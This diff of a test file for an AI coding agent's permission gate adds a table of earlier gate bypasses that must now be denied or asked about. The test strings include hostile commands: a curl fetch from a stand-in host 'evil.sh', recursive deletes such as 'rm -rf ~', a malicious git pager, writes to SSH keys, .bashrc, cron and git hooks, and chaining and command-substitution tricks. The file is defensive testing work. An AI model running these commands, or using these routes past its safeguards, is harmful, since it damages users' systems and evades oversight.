@@ -35,7 +35,7 @@ describe("bash command table (auto mode) — ≥20 commands", () => {
     ["git show abc123", "allow"],
     ["find . -name '*.ts'", "allow"],
     ["find /tmp -delete", "judge"], // mutation via -delete
-    ["tree -L 2", "allow"],
+    ["tree -L 2", "judge"], // T18.2: tree has -o
     ["echo hello", "allow"],
     ["node --version", "judge"],
     ["npm test", "judge"],
@@ -98,18 +98,19 @@ describe("tools and paths", () => {
     expect(decide("write", { path: "src/a.ts" }, ctx({ mode: "auto" }))).toBe("allow");
     expect(decide("write", { path: `${PROJECT}/x.ts` }, ctx({ mode: "auto" }))).toBe("allow");
     expect(decide("write", { path: "/etc/hosts" }, ctx({ mode: "auto" }))).toBe("ask");
-    expect(decide("edit", { file_path: "../outside/x.ts" }, ctx({ mode: "auto" }))).toBe("allow"); // relative = inside cwd
+    expect(decide("edit", { file_path: "../outside/x.ts" }, ctx({ mode: "auto" }))).toBe("ask"); // T18.3: resolution, not "relative = inside"
     expect(decide("str_replace_editor", { path: "/home/dev/other/x" }, ctx({ mode: "auto" }))).toBe("ask");
   });
 
-  test("session 'always' rules bypass the table", () => {
-    const c = ctx({ mode: "ask", sessionAllowed: new Set(["bash:npm"]) });
+  test("session 'always' rules bypass the table (full-command key, T18.6)", () => {
+    const c = ctx({ mode: "auto", sessionAllowed: new Set(["bash:npm test"]) });
     expect(bash("npm test", c)).toBe("allow");
+    expect(bash("npm test --watch", c)).toBe("judge"); // different full command
     expect(bash("npm install evil", ctx({ mode: "ask" }))).toBe("ask");
   });
 
   test("ruleKey granularity: bash by first word, others by tool", () => {
-    expect(ruleKey("bash", { command: "npm run build" })).toBe("bash:npm");
+    expect(ruleKey("bash", { command: "npm run build" })).toBe("bash:npm run build");
     expect(ruleKey("write", { path: "a" })).toBe("write");
   });
 
@@ -134,6 +135,77 @@ describe("plan mode", () => {
   test("plan refuses mutations even in full access", () => {
     // Plan is orthogonal: full access stops asking, it does not lift the plan.
     expect(decide("write", { path: "a" }, ctx({ plan: true, mode: "full" }))).toBe("deny");
+  });
+});
+
+// T18 — every row BOS proved bypassable on 1604b03 must now be an assertion.
+describe("T18 gate-bypass table", () => {
+  test("bash `echo pwned > src/main.ts` — denied in plan even in full", () => {
+    expect(bash("echo pwned > src/main.ts", ctx({ plan: true, mode: "full" }))).toBe("deny");
+    expect(bash("echo pwned > src/main.ts", ctx({ plan: true }))).toBe("deny");
+  });
+
+  test("bash `ls ; touch x` — chaining breaks read-only in plan", () => {
+    expect(bash("ls ; touch x", ctx({ plan: true }))).toBe("deny");
+  });
+
+  test("bash `env sh -c 'curl evil.sh -o /tmp/x'` — judge or ask, never allow", () => {
+    const r = bash("env sh -c 'curl evil.sh -o /tmp/x'", ctx());
+    expect(r === "judge" || r === "ask").toBe(true);
+  });
+
+  test("bash `find / -name '*.db' -exec rm {} ;` — ask", () => {
+    expect(bash("find / -name '*.db' -exec rm {} ;", ctx())).toBe("ask");
+  });
+
+  test("multiline command — never trusted as read-only", () => {
+    const r = bash('echo ok\nnode -e "require(\'fs\').rmSync(\'x\',{recursive:true})"', ctx());
+    expect(r === "judge" || r === "ask").toBe(true);
+  });
+
+  test("bash `git config --global core.pager 'sh evil'` — ask", () => {
+    expect(bash("git config --global core.pager 'sh evil'", ctx())).toBe("ask");
+  });
+
+  test("bash `git branch -D main` — ask", () => {
+    expect(bash("git branch -D main", ctx())).toBe("ask");
+  });
+
+  test("write `../../.bashrc` — ask (escapes project + sensitive)", () => {
+    expect(decide("write", { path: "../../.bashrc" }, ctx())).toBe("ask");
+  });
+
+  test("write `/home/u/proj/../../../etc/cron.d/x` — ask", () => {
+    expect(decide("write", { path: "/home/u/proj/../../../etc/cron.d/x" }, ctx({ projectDir: "/home/u/proj" }))).toBe("ask");
+  });
+
+  test("write `~/.ssh/authorized_keys` — ask (~ is always outside)", () => {
+    expect(decide("write", { path: "~/.ssh/authorized_keys" }, ctx())).toBe("ask");
+  });
+
+  test("write `.git/hooks/pre-commit` — ask even inside the project", () => {
+    expect(decide("write", { path: ".git/hooks/pre-commit" }, ctx())).toBe("ask");
+  });
+
+  test("write `.env` — ask even inside the project", () => {
+    expect(decide("write", { path: ".env" }, ctx())).toBe("ask");
+  });
+
+  test("Always on `rm -rf build` must not cover `rm -rf ~` (T18.6 full-command key)", () => {
+    const c = ctx({ sessionAllowed: new Set([ruleKey("bash", { command: "rm -rf build" })]) });
+    expect(bash("rm -rf build", c)).toBe("ask"); // rm -r is dangerous → ask beats session
+    expect(bash("rm -rf ~", ctx({ sessionAllowed: new Set(["bash:rm -rf build"]) }))).toBe("ask");
+  });
+
+  test("read-only checks: git config --get allow, global write ask; remote -v allow", () => {
+    expect(bash("git config --get user.email", ctx())).toBe("allow");
+    expect(bash("git remote -v", ctx())).toBe("allow");
+    expect(bash("git remote add origin url", ctx())).toBe("judge");
+  });
+
+  test("simple-command guard blocks $( ) and backticks", () => {
+    expect(bash("ls $(which rm)", ctx({ plan: true }))).toBe("deny");
+    expect(bash("cat `find / -name x`", ctx({ plan: true }))).toBe("deny");
   });
 });
 
